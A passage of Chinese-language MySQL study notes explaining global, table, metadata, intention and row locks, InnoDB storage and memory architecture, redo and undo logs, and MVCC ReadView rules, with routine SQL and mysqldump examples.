$ mysqldump -uroot –pxxxxxx ni9nes_DB > backup.sql 

-- 3). 释放锁
unlock tables ;
```

**特点**

数据库中加全局锁，存在以下问题：

- 如果在主库上备份，那么在备份期间都不能执行更新，业务基本停摆。
- 如果在从库上备份，那么在备份期间从库不能执行主库同步过来的二进制日志（binlog），会导致主从延迟。



在InnoDB引擎中，我们可以在备份时加上参数 `--single-transaction` 参数来完成不加锁的一致性数据备份。

```shell
$ mysqldump --single-transaction -uroot –pxxxxxx ni9nes_DB > backup.sql 
```

### 表级锁

表级锁，每次操作锁住整张表。锁定粒度大，发生锁冲突的概率最高，并发度最低。

对于表级锁，主要分为以下三类：

- **表锁 ** 
- **元数据锁**（`meta data lock`，**MDL**）
- **意向锁** 

#### 表锁

```mysql
-- 语法：
-- 加锁：
lock tables 表名... read/write。
-- 释放锁：
unlock tables / 客户端断开连接 。
```

表锁分为两类：

- 表共享读锁（`read lock`）

  ![image-20220723170341400](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/bb299ec662fe7adf011981a3c17ef53c-c38b9e5.png)

  ![image-20220723172030003](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/88cca7f981fced1f979fb26d4b59ba8f-fdba107.png)

> 左侧为客户端一，对指定表加了读锁，不会影响右侧客户端二的读，但是会阻塞右侧客户端的写。

- 表独占写锁（`write lock`）

  ![image-20220723172210146](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2b99c29792b8e7478ab7504c5dcf2150-75acf0a.png)

  ![image-20220723172939442](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/476ba7accc09c1847b42724a2e774db1-2ac5376.png)

  > 左侧为客户端一，对指定表加了写锁，不会影响左侧客户端一的读写，但是会阻塞右侧客户端二的读写。

**结论**: 

读锁不会阻塞其他客户端的读，但是会阻塞写。写锁既会阻塞其他客户端的读，又会阻塞其他客户端的写。

#### 元数据锁

**元数据锁 (`meta data lock`)**，简写**MDL**。

MDL加锁过程是**系统自动控制**，无需显式使用，在访问一张表的时候会自动加上。MDL锁主要作用是**维护表元数据的数据一致性**，在表上有活动事务的时候，不可以对元数据(表结构)进行写入操作。避免DML与DDL冲突，保证读写的正确性。

在MySQL5.5中引入了MDL，当对一张表进行增删改查的时候，加MDL读锁(共享)；当对表结构进行变更操作的时候，加MDL写锁(排他)。

常见的SQL操作时，所添加的元数据锁：

| 对应SQL | 锁类型 | 说明 |
| ------- | ------ | ---- |
|lock tables xxx read / write|SHARED_READ_ONLY / SHARED_NO_READ_WRITE||
|select 、select ... lock in share mode|SHARED_READ|与SHARED_READ、SHARED_WRITE兼容，与EXCLUSIVE互斥|
|insert 、update、delete、select ... for update|SHARED_WRITE|与SHARED_READ、SHARED_WRITE兼容，与EXCLUSIVE互斥|
|alter table ... |EXCLUSIVE |与其他的MDL都互斥|

- 当执行SELECT、INSERT、UPDATE、DELETE等语句时，添加的是元数据共享锁（SHARED_READ / SHARED_WRITE），之间是**兼容**的。

  **加表锁** 

  ![image-20220723175819441](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/101011e508bf63d311e82fc7ce963c6c-63b9d05.png)

  **事务select** 

  ![image-20220723180603661](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/d5262f0aea7cac830bd016af35112ebb-f50afaf.png)

  **事务update/insert** 

  ![image-20220723181118939](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e37ea73b4548b0a54e73933fe76f2edb-16cc895.png)

- 当执行SELECT语句时，添加的是元数据共享锁（`SHARED_READ`），会阻塞元数据排他锁（`EXCLUSIVE`），之间是**互斥**的。

  ![image-20220723182042145](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/baecfeee3ae4f1421b96e13cbe3ea44f-72fd4d2.png)



```mysql
-- mysql默认没有开启查看MDL的表performance_schema.metadata_locks,执行以下命令开启记录
SELECT * FROM performance_schema.setup_instruments;  

UPDATE performance_schema.setup_consumers SET ENABLED = 'YES' WHERE NAME ='global_instrumentation';

UPDATE performance_schema.setup_instruments SET ENABLED = 'YES' WHERE NAME ='wait/lock/metadata/sql/mdl';

select * from performance_schema.metadata_locks;
```

#### 意向锁

为了避免DML语句在执行时，加的行锁与表锁的冲突，在InnoDB中引入了意向锁，使得表锁不用检查每行数据是否加锁，使用意向锁来**减少表锁的检查**。

```
假如没有意向锁，客户端一对表加了行锁后，客户端二如何给表加表锁呢：
- 首先客户端一，开启一个事务，然后执行DML操作，在执行DML语句时，会对涉及到的行加行锁。
- 当客户端二，想对这张表加表锁时，会检查当前表是否有对应的行锁，如果没有，则添加表锁，此时就会从第一行数据，检查到最后一行数据，效率较低。

有了意向锁之后:
- 客户端一，在执行DML操作时，会对涉及的行加行锁，同时也会对该表加上意向锁。
- 其他客户端在对这张表加表锁的时候，会根据该表上所加的意向锁来判定是否可以成功加表锁，而不用逐行判断行锁情况了。
```

意向锁分为以下两种:

- **意向共享锁(IS)**: 

  由语句`select ... lock in share mode`添加 。 与 表锁共享锁(read)兼容，与表锁排他锁(write)互斥。

- **意向排他锁(IX)**: 

  由`insert`、`update`、`delete`、`select...for update`添加 。与表锁共享读锁(read)及排他写锁(write)都互斥，意向锁之间不会互斥。

> 一旦事务提交，意向共享锁(IS)、意向排他锁(IX)，都会自动释放。

- 意向共享锁与表读锁是兼容的

  ![image-20220724234304083](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2243e6e8adcbfe8fa5d06d1b9e03180b-d60a628.png)

- 意向排他锁与表读锁、写锁都是互斥的

  ![image-20220724234546059](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5bff05536f2c277a01444e2b5c4110f4-641b8fd.png)

```mysql
-- 可以通过以下SQL，查看意向锁及行锁的加锁情况：
select object_schema,object_name,index_name,lock_type,lock_mode,lock_data from performance_schema.data_locks;
```

### 行级锁

行级锁，每次操作锁住对应的行数据。锁定粒度最小，发生锁冲突的概率最低，并发度最高。应用在InnoDB存储引擎中。

InnoDB的数据是基于索引组织的，行锁是通过对索引上的**索引项加锁**来实现的，而不是对记录加的锁。对于行级锁，主要分为以下三类：

- **行锁**（`Record Lock`）：

  锁定单个行记录的锁，防止其他事务对此行进行 `update` 和 `delete`。在`RC`、`RR`隔离级别下都支持。

  ![image-20220724232422025](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/858d6d105b28007693bac6ea1ecace46-27f3df3.png)

- **间隙锁**（`Gap Lock`）：

  锁定索引记录间隙（不含该记录），确保索引记录间隙不变，防止其他事务在这个间隙进行 `insert` ，产生幻读。在`RR`隔离级别下都支持。

  ![image-20220724232430145](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/497fe4ae08548510587c5119c3fe8367-16ce6ed.png)

- **临键锁**（`Next-Key Lock`）：

  行锁和间隙锁组合，同时锁住数据，并锁住数据前面的间隙Gap。在`RR`隔离级别下支持。

  ![image-20220724232444047](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f91f8e16e2cd7e7fabdc608e47f1fdcf-4dda09b.png)

#### 行锁 REC_NOT_GAP

**InnoDB**实现了以下两种类型的行锁：

- **共享锁（S）**：允许一个事务去读一行，阻止其他事务获得相同数据集的排它锁。
- **排他锁（X）**：允许获取排他锁的事务更新数据，阻止其他事务获得相同数据集的共享锁和排他锁。

![image-20220724232604995](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f113f83fcefba3fa475920d247498e10-d00a10d.png)

常见的SQL语句，在执行时，所加的行锁如下：

| SQL  | 行锁类型 | 说明 |
| ---- | -------- | ---- |
|INSERT ... |排他锁 |自动加锁|
|UPDATE ... |排他锁 |自动加锁|
|DELETE ... |排他锁 |自动加锁|
|SELECT ...|不加任何锁||
|SELECT ... LOCK IN SHARE MODE|共享锁|需要手动在SELECT之后加LOCK IN SHARE MODE|
|SELECT ... FOR UPDATE |排他锁 |需要手动在SELECT之后加FOR UPDATE|

```mysql
-- 可以通过以下SQL，查看意向锁及行锁的加锁情况：
select object_schema,object_name,index_name,lock_type,lock_mode,lock_data from performance_schema.data_locks;
```

默认情况下，**InnoDB**在 `REPEATABLE READ`事务隔离级别运行，**InnoDB**使用 `next-key` 锁进行搜索和索引扫描，以防止幻读。

- 针对**唯一索引**进行检索时，对已存在的记录进行**等值匹配**时，将会自动优化为**行锁**。
- InnoDB的行锁是针对于索引加的锁，**不通过索引条件**检索数据，那么InnoDB将对表中的所有记录加锁，此时 就会升级为**表锁**。

**兼容情况**:

- `select...lock in share mode` 加共享锁，共享锁与共享锁之间兼容。

  ![image-20220724235441614](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/399871cad593b5fc0cd011fcf59c2d85-9bb0cc8.png)

- 共享锁与排他锁之间互斥。

  ![image-20220724235608802](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b2939baced9e166fe2fb1e7f749d8924-64fee2c.png)

  

  客户端一获取的是id为1这行的共享锁，客户端二是可以获取id为3这行的排它锁的，因为不是同一行数据。行锁类型为记录锁(`LOCK_REC_NOT_GAP`), 所以没有阻塞

  ![image-20220724235744548](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/cfea49b8e7f7037e5102f37209ede343-38082a3.png)

- 排它锁与排他锁之间互斥

  ![image-20220725000054162](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/110ac73cbf2ff67ae2cabee766bac8bb-62e9a71.png)

- 不通过索引条件检索数据,  无索引行锁升级为表锁

  ![image-20220725000531033](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/023f8ad4f04398d077d30f15272d4661-c902691.png)

  > 客户端一根据name字段进行更新时，name字段是没有索引的，如果没有索引，此时行锁会升级为表锁(因为行锁是对索引项加的锁，而name没有索引)。

#### 间隙锁&临键锁

默认情况下，**InnoDB**在 `REPEATABLE READ`事务隔离级别运行，**InnoDB**使用 `next-key` 锁进行搜索和索引扫描，以防止幻读。

- 索引上的等值查询(唯一索引)，给不存在的记录加锁时, 优化为间隙锁 (**GAP**)。

  ![image-20220725002728436](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a12cfa79e53f8b1242ce24b3bd572ac6-9ba63ea.png)

- 索引上的等值查询(非唯一普通索引)，向右遍历时最后一个值不满足查询需求时，临键锁退化为间隙锁。

  ![image-20220725030316992](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ee1bbe8d06bbeb7a58b1961476837efd-54e12bf.png)

  ```
  InnoDB的B+树索引，叶子节点是有序的双向链表。 
  假如，要根据这个二级索引查询值为user6的数据，并加上共享锁，只锁定user6这一行就可以了吗？ 
  并不是，因为是非唯一索引，这个结构中可能有多个user6的存在，所以，在加锁时会继续往后找，找到一个不满足条件的值（当前案例中也就是user7）。
  此时会对user6加临键锁，并对user7之前的间隙加锁。
  ```

- 索引上的范围查询(唯一索引)，会访问到不满足条件的第一个值为止。

  ![image-20220725031316490](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/28ef1457bc9068b3f9b0966fae45d74a-0fe4655.png)

  ```
  查询的条件为id>=6，并添加共享锁。 此时可以根据数据库表中现有的数据，将数据分为三个部分：
  [7]
  (7,15]
  (15,+∞]
  所以数据库数据在加锁是，就是将7加了行锁，15加了临键锁（包含15及15之前的间隙），正无穷加了临键锁(正无穷及之前的间隙)。
  ```

> 间隙锁唯一目的是**防止其他事务插入间隙**。间隙锁可以共存，一个事务采用的间隙锁不会阻止另一个事务在同一间隙上采用间隙锁。

## InnoDB引擎

### 逻辑存储结构

InnoDB的逻辑存储结构如下图所示:

![image-20220714154417247](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/d42eda2e8c09a47742a9b5ed59977aab-da144d6.png)

- **表空间**

  表空间是InnoDB存储引擎逻辑结构的最高层， 如果用户启用了参数 `innodb_file_per_table`，则每张表都会有一个表空间（`xxx.ibd`），一个mysql实例可以对应多个表空间，用于存储记录、索引等数据。

- **段**

  段，分为**数据段**（`Leaf node segment`）、**索引段**（`Non-leaf node segment`）、**回滚段**（`Rollback segment`），

  InnoDB是索引组织表，数据段就是B+树的叶子节点， 索引段即为B+树的非叶子节点。段用来管理多个区。

- **区**

  区，表空间的单元结构，每个区的大小为`1M`。 默认情况下， InnoDB存储引擎页大小为`16K`， 即一个区中一共有64个连续的页。

- **页**

  页，是InnoDB 存储引擎磁盘管理的最小单元，每个页的大小默认为 `16KB`。为了保证页的连续性，InnoDB 存储引擎每次从磁盘申请 4-5 个区。

- **行**

  InnoDB 存储引擎数据是按行进行存放的。

  在行中，默认有两个隐藏字段：

  - Trx_id：每次对某条记录进行改动时，都会把对应的**事务id**赋值给`trx_id`隐藏列。
  - Roll_pointer：每次对某条引记录进行改动时，都会把旧的版本写入到**undo日志**中，然后这个隐藏列就相当于一个**指针**，可以通过它来找到该记录修改前的信息。

### 系统架构

#### 概述

MySQL5.5 版本开始，默认使用InnoDB存储引擎，它擅长事务处理，具有崩溃恢复特性，在日常开发中使用非常广泛。下面是InnoDB架构图，左侧为内存结构，右侧为磁盘结构。

![image-20220725165655143](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/fa12886b382396a7867b7b72858751d9-806ebe2.png)

#### 内存结构

在左侧的内存结构中，主要分为四块： **Buffer Pool**、**Change Buffer**、**Adaptive Hash Index**、**Log Buffer**。 接下来介绍一下这四个部分: 

- **Buffer Pool 缓冲池** 

  ```
  InnoDB存储引擎基于磁盘文件存储，访问物理硬盘和在内存中进行访问，速度相差很大，为了尽可能弥补这两者之间的I/O效率的差值，就需要把经常使用的数据加载到缓冲池中，避免每次访问都进行磁盘I/O。
  
  在InnoDB的缓冲池中不仅缓存了索引页和数据页，还包含了undo页、插入缓存、自适应哈希索引以及InnoDB的锁信息等等。
  ```

  缓冲池 Buffer Pool，是**主内存**中的一个区域，里面可以**缓存**磁盘上经常操作的真实数据，在执行增删改查操作时，先**操作缓冲池中的数据**（若缓冲池没有数据，则从磁盘加载并缓存），然后再以一定频率**刷新到磁盘**，从而减少磁盘IO，加快处理速度。

  缓冲池以**Page页**为单位，底层采用链表数据结构管理Page。根据状态，将Page分为三种类型：

  - **free page**：空闲page，未被使用。
  - **clean page**：被使用page，数据没有被修改过。
  - **dirty page**：脏页，被使用page，数据被修改过，页中数据与磁盘的数据产生了不一致。

  > 在专用服务器上，通常将多达80％的物理内存分配给缓冲池 。
  >
  > 参数设置： show variables like 'innodb_buffer_pool_size';

- **Change Buffer/Insert Buffer 更改缓冲区**

  Change Buffer，更改缓冲区（针对于**非唯一二级索引页**），在执行**DML**语句时，如果这些数据Page没有在**Buffer Pool**中，不会直接操作磁盘，而会将**数据变更**存在**更改缓冲区 Change Buffer**中，在未来数据被读取时，再将数据**合并恢复**到**Buffer Pool**中，再将合并后的数据刷新到磁盘中。

  ```
  Change Buffer的意义:
  与聚集索引不同，二级索引通常是非唯一的，并且以相对随机的顺序插入二级索引。同样，删除和更新可能会影响索引树中不相邻的二级索引页，如果每一次都操作磁盘，会造成大量的磁盘IO。
  有了ChangeBuffer之后，我们可以在缓冲池中进行合并处理，减少磁盘IO。
  ```

- **Adaptive Hash Index 自适应hash索引**

  用于**优化对Buffer Pool数据的查询**。

  MySQL的innoDB引擎中虽然没有直接支持hash索引，但是给我们提供了**自适应hash索引**。

  hash索引在进行等值匹配时，一般性能是要高于B+树的，因为hash索引一般只需要一次IO即可，而B+树，可能需要几次匹配，所以hash索引的效率要高，但是hash索引又不适合做范围查询、模糊匹配等。

  InnoDB存储引擎会监控对表上各索引页的查询，如果观察到在特定的条件下hash索引可以提升速度，则建立hash索引，称之为自适应hash索引。

  > 自适应哈希索引，无需人工干预，是系统根据情况自动完成。
  > 参数： show variables like 'adaptive_hash_index';

- **Log Buffer 日志缓冲区** 

  用来保存要写入到磁盘中的log日志数据（redo log 、undo log），默认大小为 16MB，日志缓冲区的日志会定期刷新到磁盘中。如果需要更新、插入或删除许多行的事务，增加日志缓冲区的大小可以节省磁盘 I/O。

  ```
  参数:
  	innodb_log_buffer_size：缓冲区大小
  	innodb_flush_log_at_trx_commit：日志刷新到磁盘时机，取值主要包含以下三个：
  		1: 日志在每次事务提交时写入并刷新到磁盘，默认值。
  		0: 每秒将日志写入并刷新到磁盘一次。
  		2: 日志在每次事务提交后写入，并每秒刷新到磁盘一次。
  ```

#### 磁盘结构

![image-20220725170906878](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2e7114c8b6ea35a2a51f5d3ed6d27af1-5767add.png)

- **System Tablespace 系统表空间** 

  系统表空间是更改缓冲区的存储区域。如果表是在系统表空间而不是每个表文件或通用表空间中创建的，它也可能包含表和索引数据(在MySQL5.x版本中还包含InnoDB数据字典、undolog等)。系统表空间默认的文件名叫 ` ibdata1`。

  ```
  参数：
  	innodb_data_file_path
  ```

- **File-Per-Table Tablespaces** 

  如果开启了`innodb_file_per_table`开关 ，则每个表的文件表空间包含单个InnoDB表的数据和索引 ，并存储在文件系统上的单个数据文件中。即每创建一个表，都会产生一个表空间文件。

  ```
  参数：
  	innodb_file_per_table ，该参数默认开启。
  ```

- **General Tablespaces 通用表空间** 

  通用表空间，需要通过 `CREATE TABLESPACE` 语法创建通用表空间，在创建表时，可以指定该表空间。

  ```mysql
  -- 创建表空间
  CREATE TABLESPACE ts_name ADD DATAFILE 'file_name' ENGINE = engine_name; 
  -- 创建表时指定表空间
  CREATE TABLE xxx ... TABLESPACE ts_name; 
  ```

- **Undo Tablespaces 撤销表空间** 

  撤销表空间，MySQL实例在初始化时会自动创建两个默认的undo表空间（初始大小16M），用于存储undo log日志。

- **Temporary Tablespaces  临时表空间** 

  InnoDB 使用会话临时表空间和全局临时表空间。存储用户创建的临时表等数据。

- **Doublewrite Buffer Files 双写缓冲区**

  双写缓冲区，innoDB引擎将数据页从Buffer Pool刷新到磁盘前，先将数据页写入双写缓冲区文件中，便于系统异常时恢复数据。

- **Redo Log 重做日志** 

  重做日志，是用来实现事务的持久性。该日志文件由两部分组成：重做日志缓冲（redo log buffer）以及重做日志文件（redo log）,前者是在内存中，后者在磁盘中。

  当事务提交之后会把所有修改信息都会存到该日志中, 用于在刷新脏页到磁盘时,发生错误时, 进行数据恢复使用。以循环方式写入重做日志文件，涉及两个文件：

  ```
  ib_logfile0
  ib_logfile1
  ```

#### 后台线程

在InnoDB的后台线程中，分为4类，分别是：**Master Thread** 、**IO Thread**、**Purge Thread**、**Page Cleaner Thread**。

- **Master Thread 核心后台线程** 

  核心后台线程，负责调度其他线程，还负责将缓冲池中的数据异步刷新到磁盘中, 保持数据的一致性，还包括脏页的刷新、合并插入缓存、undo页的回收 。

- **IO Thread** 

  在InnoDB存储引擎中大量使用了异步IO(AIO)来处理IO请求, 这样可以极大地提高数据库的性能，而IO Thread主要负责这些IO请求的回调。

  可以通过以下的这条指令，查看到InnoDB的状态信息，其中就包含IO Thread信息。

  ```mysql
  show engine innodb status \G; 
  ```

  ![image-20220725171925735](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/433b6b9a62b16fb0aeb8cab38b5aa506-3c762d4.png)

  | 线程类型 | 默认个数 | 职责 |
  | -------- | -------- | ---- |
  |Read thread |4 |负责读操作|
  |Write thread |4 |负责写操作|
  |Log thread |1 |负责将日志缓冲区刷新到磁盘|
  |Insert buffer thread |1 |负责将写缓冲区内容刷新到磁盘|

- **Purge Thread** 

  主要用于回收事务已经提交了的undo log，在事务提交之后，undo log可能不用了，就用它来回收。

- **Page Cleaner Thread** 

  协助 Master Thread 刷新脏页到磁盘的线程，可以减轻 Master Thread 的工作压力，减少阻塞。

### 事务原理

#### 事务基础

1). 事务

事务 是一组操作的集合，它是一个不可分割的工作单位，事务会把所有的操作作为一个整体一起向系统提交或撤销操作请求，即这些操作要么同时成功，要么同时失败。

2). 特性

- **原子性**（Atomicity）：事务是不可分割的最小操作单元，要么全部成功，要么全部失败。
- **一致性**（Consistency）：事务完成时，必须使所有的数据都保持一致状态。
- **隔离性**（Isolation）：数据库系统提供的隔离机制，保证事务在不受外部并发操作影响的独立环境下运行。
- **持久性**（Durability）：事务一旦提交或回滚，它对数据库中的数据的改变就是永久的。

对于这四大特性，实际上分为两个部分。 其中的**原子性、一致性、持久性**，实际上是由InnoDB中的两份日志来保证的，一份是**redo log**日志，一份是**undo log**日志。 而**隔离性**是通过数据库的锁，加上MVCC来保证的。

![image-20220725172358339](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e4d30a0cbda9d1d32baf42c027631376-cda8a2d.png)

#### redo log 重做日志

重做日志，记录的是事务提交时数据页的物理修改，是用来实现事务的持久性。

该日志文件由两部分组成：**重做日志缓冲（redo log buffer）**以及**重做日志文件（redo log file）**,前者是在内存中，后者在磁盘中。当事务提交之后会把所有修改信息都存到该日志文件中, 用于在刷新脏页到磁盘,发生错误时, 进行数据恢复使用。

**redolog解决的问题:** 

```
在InnoDB引擎中的内存结构中，主要的内存区域就是缓冲池，在缓冲池中缓存了很多的数据页。 
当我们在一个事务中，执行多个增删改的操作时，InnoDB引擎会先操作缓冲池中的数据，如果缓冲区没有对应的数据，会通过后台线程将磁盘中的数据加载出来，存放在缓冲区中，然后将缓冲池中的数据修改，修改后的数据页我们称为脏页。 
而脏页则会在一定的时机，通过后台线程刷新到磁盘中，从而保证缓冲区与磁盘的数据一致。 而缓冲区的脏页数据并不是实时刷新的，而是一段时间之后将缓冲区的数据刷新到磁盘中，假如刷新到磁盘的过程出错了，而提示给用户事务提交成功，而数据却没有持久化下来。
这就出现问题了，没有保证事务的持久性。
```

![image-20220725172726041](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/964777040df334057a5c7b728749bc5b-45438d9.png)

```
有了redo log之后，当对缓冲区的数据进行增删改之后，会首先将操作的数据页的变化，记录在redo log buffer中。在事务提交时，会将redo log buffer中的数据刷新到redo log磁盘文件中。
过一段时间之后，如果刷新缓冲区的脏页到磁盘时，发生错误，此时就可以借助于redo log进行数据恢复，这样就保证了事务的持久性。 
而如果脏页成功刷新到磁盘 或 或者涉及到的数据已经落盘，此时redolog就没有作用了，就可以删除了，所以存在的两个redolog文件是循环写的。
```

![image-20220725172834250](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/d1510d86fdd4dfa67221676efa01f607-464287b.png)

```
那为什么每一次提交事务，要刷新redo log 到磁盘中呢，而不是直接将buffer pool中的脏页刷新到磁盘呢?

因为在业务操作中，我们操作数据一般都是随机读写磁盘的，而不是顺序读写磁盘。 
而redo log在往磁盘文件中写入数据，由于是日志文件，所以都是顺序写的。顺序写的效率，要远大于随机写。 
这种先写日志的方式，称之为 WAL（Write-Ahead Logging）。
```

#### undo log 回滚日志

回滚日志，用于记录数据被修改前的信息 , 作用包含 : **提供回滚**(保证事务的原子性) 和 **MVCC**(多版本并发控制) 。

undo log和redo log记录物理日志不一样，它是**逻辑日志**。可以认为当delete一条记录时，undo log中会记录一条对应的insert记录，反之亦然，当update一条记录时，它记录一条对应相反的update记录。当执行rollback时，就可以从undo log中的逻辑记录读取到相应的内容并进行回滚。

**Undo log销毁**：

undo log在事务执行时产生，事务提交时，并不会立即删除undo log，因为这些日志可能还用于MVCC。

**Undo log存储**：

undo log采用段的方式进行管理和记录，存放在 rollback segment回滚段中，内部包含1024个undo log segment。

### MVCC 

#### 基本概念

MVCC 全称 `Multi-Version Concurrency Control`，**多版本并发控制**。指维护一个数据的多个版本，使得读写操作没有冲突，快照读为MySQL实现MVCC提供了一个非阻塞读功能。

MVCC的具体实现，还需要依赖于数据库记录中的**三个隐式字段**、**undo log日志**、**readView**。

```
- 当前读
读取的是记录的最新版本，读取时还要保证其他并发事务不能修改当前记录，会对读取的记录进行加锁。
对于我们日常的操作，如：select ... lock in share mode(共享锁)，select ...for update、update、insert、delete(排他锁)都是一种当前读。

- 快照读
简单的select（不加锁）就是快照读，快照读，读取的是记录数据的可见版本，有可能是历史数据，不加锁，是非阻塞读。
• Read Committed：每次select，都生成一个快照读。
• Repeatable Read：开启事务后第一个select语句才是快照读的地方。
• Serializable：快照读会退化为当前读。
```

#### 隐藏字段

InnoDB引擎中, 当创建一张表时，除了显式声明的字段以外，InnoDB还会自动添加三个隐藏字段:

| 隐藏字段 | 含义 |
| -------- | ---- |
|**DB_TRX_ID** |最近修改事务ID，记录插入这条记录或最后一次修改该记录的事务ID。|
|**DB_ROLL_PTR**|回滚指针，指向这条记录的上一个版本，用于配合undo log，指向上一个版本。|
|**DB_ROW_ID** |隐藏主键，如果表结构没有指定主键，将会生成该隐藏字段。|

> 前两个字段是肯定会添加的， 是否添加最后一个字段DB_ROW_ID，得看当前表有没有主键，如果有主键，则不会添加该隐藏字段。

#### undolog 回滚日志

回滚日志，在insert、update、delete的时候产生的便于数据回滚的日志。

当insert的时候，产生的undo log日志只在回滚时需要，在事务提交后，可被立即删除。
而update、delete的时候，产生的undo log日志不仅在回滚时需要，在快照读时也需要，不会立即被删除。

**版本链** 

有一张表原始数据为：

![image-20220725173850252](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/483ffb8f04470fb15a0fc30636e950cd-df3b43a.png)

> DB_TRX_ID : 代表最近修改事务ID，记录插入这条记录或最后一次修改该记录的事务ID，是自增的。
> DB_ROLL_PTR ： 代表回滚指针, 由于这条数据是才插入的，没有被更新过，所以该字段值为null。

然后，有四个并发事务同时在访问这张表。生成版本链

![image-20220725173926748](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/227afff3f0435f60774ce9dcd001e27e-a62c0f3.png)

![image-20220725173954540](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c7f59ef11d6d89d043935a2c1138fc8f-12271f1.png)

> 不同事务或相同事务对同一条记录进行修改，会导致该记录的undolog生成一条记录版本链表，链表的头部是最新的旧记录，链表尾部是最早的旧记录。

#### readview 读视图

ReadView(读视图)是 快照读 SQL执行时MVCC提取数据的依据，记录并维护系统当前**活跃的事务(未提交的)id**。

ReadView中包含了四个核心字段：

| 字段 | 含义 |
| ---- | ---- |
|**m_ids** |当前活跃的事务ID集合|
|**min_trx_id** |最小活跃事务ID|
|**max_trx_id** |预分配事务ID，当前最大事务ID+1（因为事务ID是自增的）|
|**creator_trx_id** |ReadView创建者的事务ID|

在readview中规定了版本链数据的访问规则：

- `trx_id == creator_trx_id` 可以访问该版本, 说明数据是当前这个事务更改的。
- `trx_id < min_trx_id`  可以访问该版本 ，说明数据已经提交了。
- `trx_id > max_trx_id` 不可以访问该版本，说明该事务是在ReadView生成后才开启。
- `min_trx_id <= trx_id<= max_trx_id`  如果trx_id不在m_ids中，是可以访问该版本的，说明数据已经提交。

> trx_id 代表当前undolog版本链对应事务ID。

不同的隔离级别，生成ReadView的时机不同：

- **READ COMMITTED** ：在事务中每一次执行快照读时生成ReadView。
- **REPEATABLE READ**：仅在事务中第一次执行快照读时生成ReadView，后续复用该ReadView。

#### 原理分析

- **RC隔离级别** 

  RC隔离级别下，在事务中每一次执行快照读时生成ReadView。

  在事务5中，查询了两次id为30的记录，由于隔离级别为Read Committed，所以每一次进行快照读都会生成一个ReadView，那么两次生成的ReadView如下:

  ![image-20220725175207478](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/eeaae0a757f830f2e7ff00d7a1d49087-80f29d1.png)

  那么这两次快照读在获取数据时，就需要根据所生成的ReadView以及ReadView的版本链访问规则，到undolog版本链中匹配数据，最终决定此次快照读返回的数据。

  - **第一次快照读具体的读取过程**：

    ![image-20220725175305169](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/44a985a568d82f339f6b817c5a5d51ad-b3301a6.png)

    ![image-20220725175310951](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8159017fd5b2ac88b7c8b5fd9e069a76-da89c74.png)

    在进行匹配时，会从undo log的版本链，从上到下进行挨个匹配：

    1) . 先匹配 `30, 10, A3, 4, 0x0003`这条记录

    这条记录对应的trx_id为4，也就是将4带入右侧的匹配规则中:  

    ​		①不满足 ②不满足 ③不满足 ④也不满足 ，

    都不满足，则继续匹配undo log版本链的下一条。

    2) . 再匹配第二条` 0x0003| 30, 3, A3, 3, 0x0002` 

    这条记录对应的trx_id为3，也就是将3带入右侧的匹配规则中:

    ​		①不满足 ②不满足 ③不满足 ④也不满足 ，

    都不满足，则继续匹配undo log版本链的下一条。
    3) . 再匹配第三条 ` 0x0002| 30, 3, A30, 2, 0x0001` 

    这条记录对应的trx_id为2，也就是将2带入右侧的匹配规则中:

    ​		①不满足 ②满足 终止匹配，

    此次快照读，返回的数据就是版本链中记录的这条数据。

  - **第二次快照读具体的读取过程**:

    ![image-20220725175825200](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2fc947d8a663570b6aad7bc2c60dfaf0-30fbaea.png)

    ![image-20220725175829186](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c4e27df50bc8e1340b460bcd9620669e-5fba479.png)

    在进行匹配时，会从undo log的版本链，从上到下进行挨个匹配：

    1) . 先匹配 `30, 10, A3, 4, 0x0003`这条记录

    这条记录对应的trx_id为4，也就是将4带入右侧的匹配规则中:  

    ​		①不满足 ②不满足 ③不满足 ④也不满足 ，

    都不满足，则继续匹配undo log版本链的下一条。

    2) . 再匹配第二条` 0x0003| 30, 3, A3, 3, 0x0002` 

    这条记录对应的trx_id为3，也就是将3带入右侧的匹配规则中:

    ​		①不满足 ②满足 终止匹配，

    此次快照读，返回的数据就是版本链中记录的这条数据。

- **RC隔离级别**

  RR隔离级别下，仅在事务中第一次执行快照读时生成ReadView，后续复用该ReadView。 而RR 是可重复读，在一个事务中，执行两次相同的select语句，查询到的结果是一样的。

